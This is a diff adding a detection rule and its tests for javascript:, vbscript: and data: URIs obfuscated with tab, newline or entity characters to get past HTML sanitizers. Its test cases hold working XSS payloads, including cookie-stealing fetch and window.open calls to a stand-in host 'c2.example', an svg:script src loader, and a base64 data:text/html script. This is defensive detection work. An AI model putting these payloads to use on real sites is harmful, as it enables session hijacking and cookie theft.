@@ -1,0 +1,272 @@
+title: "Dangerous URI Scheme Obfuscated by Interstitial Characters"
+id: ATR-2026-02623
+rule_version: 2
+status: "experimental"
+description: >
+  Detects a javascript:, vbscript: or data:text/html URI whose SCHEME NAME has
+  been broken up by characters that a URL parser discards but a string-matching
+  sanitizer does not: a raw tab, newline, carriage return or NUL, the numeric
+  character reference for any of them, or a zero-padded numeric reference
+  standing in for the scheme's first letter. Also covers an svg-namespaced
+  script element carrying an HTML-style src attribute, a construct SVG itself
+  never uses (SVG script loads through href / xlink:href) and which therefore
+  only appears when something is aiming at an HTML parser past a sanitizer.
+  CVE-2026-31807 (SiYuan SVG sanitizer bypass) and CVE-2022-1243 (urijs
+  incorrect protocol extraction via CR, LF and TAB) are the same defect seen
+  from two sides.
+
+  MEASURED GAP. `<a href="java&#9;script:alert(document.cookie)">`, a raw-newline
+  split, and a zero-padded `&#0000000106;avascript:` all returned zero real
+  matches across the seven event types, while the plain
+  `<a href="javascript:fetch(document.cookie)">` control fires ATR-2026-00511,
+  00571 and 00497. Reading ATR-2026-00571 explains why: its pattern is
+  `javascript:\s*(?:alert|eval|document\.|window\.|fetch|...)`, which binds both
+  the literal scheme spelling and the callee that follows it. This rule
+  deliberately does NOT require a callee -- an attacker who has already spelled
+  the scheme as java&#9;script: has declared intent, and requiring a known callee
+  is what let `javascript:new Function(atob(...))` through in the first place.
+
+  WHY A QUOTED URI-BEARING POSITION IS REQUIRED. The first draft matched the
+  split scheme anywhere. Measured against hand-written benign text it fired on
+  YAML and on wrapped prose, because `- java` on one line followed by `script:`
+  on the next contains the literal java\nscript: sequence. Newline is not
+  droppable from the junk set -- CVE-2022-1243 names LF explicitly -- so the
+  draft required the match to sit where a URI goes: an href/src/action
+  attribute, a navigation argument, or a markdown link target.
+
+  That was not enough, and adversarial review measured why. The position test is
+  a substring test with no word boundary, so `permalink:`, `redirect_uri:`,
+  `avatarUrl:`, `geolocation:`, `transaction:` and `EXTRACTION=` all satisfied
+  it, and every one of the original FPs came straight back -- in YAML, in a
+  Makefile, in a JS object literal, in an OpenAPI document, in a TSV table, in a
+  CHANGELOG and in Japanese prose (11 measured FPs). The discriminator that
+  actually works is the QUOTE: a URI sitting in an href, a src or a navigation
+  argument is always quoted, while a bare YAML scalar or a make variable is not.
+  The quote is therefore mandatory on the keyword branch. The markdown branch
+  keeps no quote but may no longer cross a line break, since a CommonMark inline
+  destination starts on the same line as `](` -- allowing \s* there let
+  `handlers["java"](\njava\nscript: ctx)` match.
+
+  SCOPE. The entity-encoded COLON form (javascript&#58;) is not covered here.
+  The bare `<svg:script>...</svg:script>` element is deliberately NOT covered
+  either: adversarial review measured it firing on an Apache Batik CDATA example
+  and on a zh-TW XHTML+SVG tutorial exactly as it fired on the payload, because
+  at the pattern tier the two differ only in the script body, which this rule
+  does not read. Only the src-attribute form, which SVG never legitimately
+  produces, is kept.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: high
+
+references:
+  cve:
+    - "CVE-2026-31807"
+    - "CVE-2022-1243"
+  owasp_llm:
+    - "LLM05:2025"
+  owasp_agentic:
+    - "ASI04:2026"
+  mitre_atlas:
+    - "AML.T0051 - LLM Prompt Injection"
+    - "AML.T0057 - LLM Data Leakage"
+
+compliance:
+  owasp_agentic:
+    - id: ASI04:2026
+      context: "Content the agent emits or relays executes in the rendering surface, taking actions in the victim's session that the agent was never asked to take."
+      strength: primary
+  owasp_llm:
+    - id: LLM05:2025
+      context: "Improper output handling: model or tool output containing an executable URI is rendered without neutralisation, which is the canonical instance of this category."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 robustness: an obfuscated scheme is an explicit attempt to defeat the system's own input sanitisation, which is the attack class the article names."
+      strength: primary
+    - article: "9"
+      context: "Rendered-output injection is a documented risk for agents with a UI surface; these detections are the Article 9 monitoring control."
+      strength: secondary
+    - article: "12"
+      context: "Article 12 record-keeping: script execution in a rendered surface leaves no server-side trace of its own."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.2.3
+      context: "Runtime treatment for executable content reaching a rendering surface through agent output."
+      strength: primary
+    - function: Map
+      subcategory: MP.5.1
+      context: "Catalogues sanitizer-evasion encodings as distinct from the plain scheme, which is exactly the half existing coverage missed."
+      strength: secondary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events supply the security and resilience evidence MEASURE 2.7 asks be documented for the rendering path."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 operational control: content leaving the system carries executable code into a downstream surface."
+      strength: primary
+    - clause: "6.2"
+      context: "Preventing script execution in rendered agent output is an AIMS information security objective under clause 6.2."
+      strength: secondary
+    - clause: "8.4"
+      context: "Impact assessment under clause 8.4 must account for agent output rendered in a browser under a user's own session."
+      strength: secondary
+
+tags:
+  category: context-exfiltration
+  subcategory: sanitizer-evasion
+  scan_target: both
+  confidence: medium
+
+agent_source:
+  type: llm_io
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    - field: content
+      operator: regex
+      value: "(?i)(?:(?:href|src|action|formaction|xlink:href|url|uri|link|location|open_url|navigate|goto|window\\s*\\.\\s*open)\\s*[=(:]\\s*(?:\\\\{0,2}[\\\"'`])\\s*|\\]\\([ \\t]{0,4})(?:j(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}avascript|ja(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}vascript|jav(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}ascript|java(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}script|javas(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}cript|javasc(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}ript|javascr(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}ipt|javascri(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}pt|javascrip(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}t|v(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}bscript|vb(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}script|vbs(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}cript|vbsc(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}ript|vbscr(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}ipt|vbscri(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}pt|vbscrip(?:[\\x00\\x09\\x0a\\x0d]|&#x0*(?:9|a|d);|&#0*(?:9|10|13);|&Tab;|&NewLine;){1,10}t)\\s*:"
+      description: "Dangerous URI scheme split by a character the parser discards -- raw CR/LF/TAB/NUL or its numeric character reference -- in a URI-bearing position"
+
+    - field: content
+      operator: regex
+      value: "(?i)(?:(?:href|src|action|formaction|xlink:href|url|uri|link|location|open_url|navigate|goto|window\\s*\\.\\s*open)\\s*[=(:]\\s*(?:\\\\{0,2}[\\\"'`])\\s*|\\]\\([ \\t]{0,4})(?:&#0*106;|&#x0*6a;)avascript\\s*:|(?:(?:href|src|action|formaction|xlink:href|url|uri|link|location|open_url|navigate|goto|window\\s*\\.\\s*open)\\s*[=(:]\\s*(?:\\\\{0,2}[\\\"'`])\\s*|\\]\\([ \\t]{0,4})(?:&#0*118;|&#x0*76;)bscript\\s*:|(?:(?:href|src|action|formaction|xlink:href|url|uri|link|location|open_url|navigate|goto|window\\s*\\.\\s*open)\\s*[=(:]\\s*(?:\\\\{0,2}[\\\"'`])\\s*|\\]\\([ \\t]{0,4})(?:&#0*100;|&#x0*64;)ata\\s*:\\s*text/html"
+      description: "Dangerous URI scheme whose leading character is supplied as a zero-padded numeric character reference"
+
+    - field: content
+      operator: regex
+      value: "(?i)<\\s*svg\\s*:\\s*script\\b[^>]{0,200}\\bsrc\\s*="
+      description: "Namespace-prefixed script ELEMENT -- an opening tag carrying a src attribute or closed by a matching end tag, not a bare mention of the tag name in prose"
+
+  condition: any
+  false_positives:
+    - "Text where 'java' ends a line and a 'script:' key begins the next -- YAML, workflow files, wrapped prose. Measured during authoring, then measured AGAIN in adversarial review because the URI-position test had no word boundary. Now excluded by requiring the value to be quoted."
+    - "Security writing or a sanitizer test suite that quotes an obfuscated scheme verbatim, including this rule's own test cases. Measured in adversarial review: an explainer showing the payload inside a fenced code block fires, and so does prose warning that <svg:script src=> is the wrong attribute. Both are the payload bytes; the pattern tier cannot see the surrounding intent, and suppress_in_code_blocks is deliberately NOT set because a markdown fence would then be a one-character evasion."
+    - "The plain javascript: scheme is deliberately NOT matched here; ATR-2026-00571 already covers it"
+    - "A quoted URI-position value that legitimately begins with the token 'java' or 'vb' and is followed only by a raw TAB/CR/LF and then a 'script:' token -- e.g. a YAML scalar src: \"java<TAB>script: label\" or a JS template literal `java\\nscript: ...`. Both were constructed adversarially and neither is idiomatic, but they remain reachable: dropping raw TAB/LF from the junk set would delete the CVE-2022-1243 core, so they are accepted."
+    - "Namespace-prefixed script elements that are ordinary markup -- <html:script src=>, <xhtml:script src=> in an XSLT stylesheet, <ns2:script> in a JAXB/SOAP payload. Measured FPs in adversarial review; the prefix set is now svg only."
+    - "Documentation showing a complete <svg:script>...</svg:script> worked example. NOT a false positive any more and NOT detected either: that branch was removed after it fired identically on an Apache Batik CDATA example, a zh-TW compound-document tutorial and the attack payload. Detecting it needs the script body, which is a different tier."
+
+response:
+  actions:
+    - alert
+  auto_response_threshold: high
+  message_template: >
+    [ATR-2026-02623] Dangerous URI scheme obfuscated so a string-matching
+    sanitizer cannot see it, but a browser still executes it. Do not render this
+    content (CVE-2026-31807 / CVE-2022-1243 class).
+
+confidence: 75
+test_cases:
+  true_positives:
+    - input: "<a href=\"java&#9;script:alert(document.cookie)\">click</a>"
+      expected: triggered
+      description: "Tab entity inside the scheme -- the SiYuan CVE-2026-31807 sanitizer bypass"
+    - input: "set_href(\"java\nscript:alert(document.domain)\")"
+      expected: triggered
+      description: "Raw newline inside the scheme (urijs CVE-2022-1243 protocol-extraction bug)"
+    - input: "<a href=\"java\tscript:fetch('//c2.example/'+document.cookie)\">report</a>"
+      expected: triggered
+      description: "Raw tab inside the scheme"
+    - input: "<a href=\"&#0000000106;avascript:fetch(1)\">x</a>"
+      expected: triggered
+      description: "Zero-padded decimal reference for the leading j; HTML5 sets no limit on leading zeros"
+    - input: "<a href=\"&#x0000006a;avascript:alert(1)\">x</a>"
+      expected: triggered
+      description: "Zero-padded hex reference for the leading j"
+    - input: "[report](java&#10;script:alert(1))"
+      expected: triggered
+      description: "Markdown link target with a newline entity inside the scheme"
+    - input: "<a href=\"vb&#9;script:msgbox(1)\">legacy</a>"
+      expected: triggered
+      description: "Tab entity inside the vbscript scheme"
+    - input: "window.open(\"java&#13;script:document.location='//c2.example'\")"
+      expected: triggered
+      description: "Carriage-return entity inside the scheme, via window.open"
+    - input: "<svg:script src=\"//c2.example/steal.js\"></svg:script>"
+      expected: triggered
+      description: "svg-namespaced script element loading through an HTML-style src attribute -- SVG script uses href/xlink:href, so src here is aimed at an HTML parser past a sanitizer"
+    - input: "<a href=\"&#100;ata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">open</a>"
+      expected: triggered
+      description: "Entity-encoded leading d on a data:text/html payload"
+  true_negatives:
+    - input: "languages:\n  - java\nscript: npm run build\n"
+      expected: not_triggered
+      description: "MEASURED FP during authoring: a YAML list ending in 'java' followed by a 'script:' key contains the literal java\\nscript: sequence. Forced condition 1 to require a URI-bearing position."
+    - input: "Supported runtimes: python, go, java\nscript: see the matrix in CONTRIBUTING.md"
+      expected: not_triggered
+      description: "MEASURED FP during authoring: prose line-wrapping that puts 'java' at end of line and 'script:' at the start of the next"
+    - input: "<a href=\"javascript:void(0)\" onclick=\"submit()\">Save</a>"
+      expected: not_triggered
+      description: "The plain, unobfuscated scheme -- already covered by ATR-2026-00571; this rule deliberately does not duplicate it"
+    - input: "<a href=\"https://developer.mozilla.org/docs/Web/URI/Schemes/javascript\">javascript: URI docs</a>"
+      expected: not_triggered
+      description: "A link whose target is documentation ABOUT the scheme"
+    - input: "The SiYuan advisory explains the bypass: whitespace such as a tab or newline inside java script: is stripped by the parser but not by the sanitizer."
+      expected: not_triggered
+      description: "Security writing describing this very attack, with the scheme spelled with a space"
+    - input: "<script type=\"text/javascript\" src=\"/static/app.js\"></script>"
+      expected: not_triggered
+      description: "An ordinary script tag whose type attribute contains the javascript token"
+    - input: "{\"href\": \"/reports/q3\", \"src\": \"/img/logo.png\", \"lang\": \"javascript\"}"
+      expected: not_triggered
+      description: "A JSON object carrying href, src and the javascript token, none of them a scheme"
+    - input: "- name: build\n  uses: actions/setup-java@v4\nscript: ./gradlew test"
+      expected: not_triggered
+      description: "GitHub Actions workflow with a setup-java step above a script key. Measured: this one does not fire even the naive no-context pattern, because @v4 sits between the two tokens. Kept so that stays true."
+    - input: "url: https://cdn.example.com/vendor/vbscript-shim.js"
+      expected: not_triggered
+      description: "A url key whose value merely contains the vbscript token as part of a filename"
+    - input: "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>/* inline */</script></svg>"
+      expected: not_triggered
+      description: "An inline script inside an SVG using the plain tag name, not a namespace prefix"
+    - input: "README: to embed a diagram, use [the guide](https://docs.example.com/diagrams). Do not use inline <svg:script> - it is stripped on render."
+      expected: not_triggered
+      description: "MEASURED FP during authoring: condition 3 originally matched the bare tag name, so documentation naming <svg:script> fired. Fixed by requiring a src attribute or a matching end tag."
+    - input: "markdown link to the docs: [javascript: scheme](https://example.com/uri-schemes)"
+      expected: not_triggered
+      description: "Markdown link whose visible text is the scheme name and whose target is https"
+    - input: "CI log :: [lint] no-script-url: unexpected use of javascript: url in src/nav.tsx:42 :: 1 error"
+      expected: not_triggered
+      description: "ESLint output naming the rule and the offending scheme"
+    - input: "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:html=\"http://www.w3.org/1999/xhtml\">\n  <xsl:template match=\"/report\">\n    <html:head>\n      <html:script src=\"/static/report.js\" type=\"text/javascript\"></html:script>\n    </html:head>\n  </xsl:template>\n</xsl:stylesheet>"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: an XSLT stylesheet emitting an XHTML-namespaced script element. Fixed by narrowing the prefix set from svg|xhtml|html|xlink|ns\\d? to svg alone."
+    - input: "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <ns2:getScriptResponse xmlns:ns2=\"http://api.example.com/v2\">\n      <ns2:script>SELECT 1</ns2:script>\n    </ns2:getScriptResponse>\n  </soap:Body>\n</soap:Envelope>"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: ns\\d? in the prefix set collided with the ns2: prefix JAXB generates for every SOAP payload"
+    - input: "ingress:\n  environment:\n    url: java\nscript:\n  - mvn -B deploy\n"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: an UNQUOTED YAML url key whose value is java, followed by a top-level script key. The URI-position gate accepted it; requiring the quote rejects it."
+    - input: "---\ntitle: \"Java vs JavaScript\"\npermalink: java\nscript: /assets/js/highlight.js\nlayout: post\n---\n"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: permalink ends in the literal link, so the position test had no word boundary and the front matter matched"
+    - input: "PYTHON=python3\nLANG_FOR_EXTRACTION=java\nscript:\n\t@npm run build\n"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: a make variable ending in ACTION assigned the value java, above a script: target"
+    - input: "const user = {\n  name: \"aki\",\n  avatarUrl: java\nscript: \"profile.js\"\n};\n"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: avatarUrl ends in url; the value is an unquoted identifier, not a URI"
+    - input: "runtime\tversion\tstatus\naction:\tjava\tscript:\tenabled\n"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: a tab-separated table whose cells happen to be action:, java and script:"
+    - input: "\u30d3\u30eb\u30c9\u8a2d\u5b9a\u306e link: java\nscript: npm run build \u3092\u5b9f\u884c\u3057\u3066\u304f\u3060\u3055\u3044\u3002"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: Japanese build documentation with an unquoted link: java line above a script: line"
+    - input: "Read [the build guide](\njava\nscript: docs/build.md\n) before starting."
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: the markdown branch allowed \\s* after ](, so a destination written on the following line matched. CommonMark inline destinations start on the same line; the branch now allows spaces and tabs only."
+    - input: "Apache Batik requires the ECMAScript to sit in CDATA:\n<svg:script type=\"text/ecmascript\"><![CDATA[\n  function redraw() { document.getElementById(\"bar\").setAttribute(\"width\", 120); }\n]]></svg:script>"
+      expected: not_triggered
+      description: "MEASURED FP in adversarial review: a benign Apache Batik worked example fired the end-tag branch exactly as the payload did. That branch was removed -- at the pattern tier the two differ only in the script body."
+    - input: "## 3.0.9\n- Fixed a mutation XSS that allowed the <svg:script> element to survive sanitization when FORCE_BODY was set.\n- Bumped test corpus."
+      expected: not_triggered
+      description: "A sanitizer CHANGELOG naming the element without showing a complete one"
